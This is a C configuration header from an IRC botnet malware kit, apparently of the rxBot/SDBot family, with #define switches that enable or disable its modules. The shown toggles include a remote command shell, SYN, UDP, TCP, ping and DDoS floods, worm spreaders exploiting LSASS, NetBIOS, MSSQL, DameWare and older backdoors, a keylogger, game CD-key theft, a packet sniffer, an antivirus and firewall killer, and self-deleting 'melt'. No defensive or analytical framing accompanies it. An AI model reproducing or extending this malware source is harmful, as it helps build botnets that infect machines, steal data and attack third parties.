 #define NO_IDENT      // disables Ident server
// #define NO_NETINFO    // disables Network info function
// #define NO_SYSINFO    // disables System info function
// #define NO_DCC        // disables DCC Chat/Send/Get functions
// #define NO_REMOTECMD  // disables Remote Command Shell function
// #define NO_PROCESS    // disables Process control (ps/kill) functions
// #define NO_DOWNLOAD   // disables Downloading/updating functions
// #define NO_VISIT      // disables Visiting URLs
// #define NO_PSNIFF     // disables Psniff Carnivore function
// #define NO_CONNCHECK  // disables Check for internet connection
// #define NO_BOTVERSION // disables Bot version
// #define NO_SCAN       // disables Port scanner
// #define NO_SECURE     // disables Secure
// #define NO_PING       // disables PING Flood
 #define NO_NETBIOS       // disables NetBios spreader
// #define NO_UDP        // disables UDP Flood
 
 #define NO_SUB7       // disables Sub7 Spreader
 #define NO_NETDEVIL   // disables Netdevil Spreader
 #define NO_MSSQL
 #define NO_DAMEWARE
 #define NO_UPNP
 #define NO_OPTIX
 #define NO_MYDOOM
// #define NO_SYN        // disables SYN Flood
// #define NO_REDIRECT   // disables Port Redirect function
 #define NO_KUANG2     // disables Kuang2 Spreader
 #define NO_KEYLOG     // disables Key logger function
// #define NO_SOCK4SERV  // disables SOCKS4 daemon functions

// #define NO_HTTP       // disables HTTP server functions
// #define NO_TFTP       // disables TFTP server functions

// #define NO_CDKEYS     // disables Game cd key checks
// #define NO_WILDCARD   // disables Wildcard authost
// #define NO_TCP        // disables TCP Flood
 #define NO_BEAGLE     // disables Beagle Spreader
// #define NO_LSASS      // disables LSASS Spreader
// #define NO_DDOS       // disables DDOS Flood
// #define NO_FINDFILE   // disables File search function
// #define NO_CAPTURE    // disables Screen Capture functions
// #define NO_DAMEWARE   // disables DameWare Spreader
// #define NO_CONSTNICK  // disables constant nick prefix
// #define NO_MIRCNICK   // disables mIRC nick prefix
 #define NO_MODEONCONN // disables setting user modes on-connect
// #define NO_NET        // disables Net Share/Service control functions
 #define NO_AVFW_KILL  // disables Anti-Virus & Firewall process killer
 #define NO_REGISTRY   // disables Registry Monitor on startup function
// #define NO_SECSYSTEM  // disables System Secure Monitor on startup function
// #define NO_MELT       // disables file melt (delete) on start-up
// #define NO_CRYPT      // disables Crypted Strings (disabled when using DUMP_ENCRYPT)
// #define DEBUG_LOGGING  // enables protocol dumping to a log file for testing purposes
 #define IDENTSTARTUP // desables the identd on start

#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define IRCLINE			512
#define MAXTHREADS		256
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		9
#define MAX_LINES		100
#define MAXSCANTHRD		250
#define MAXSCANTIME		999999
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()

#define BOTP  0
#define IRCP  1
#define FTPP  2
#define HTTPP 3
#define SSHP  4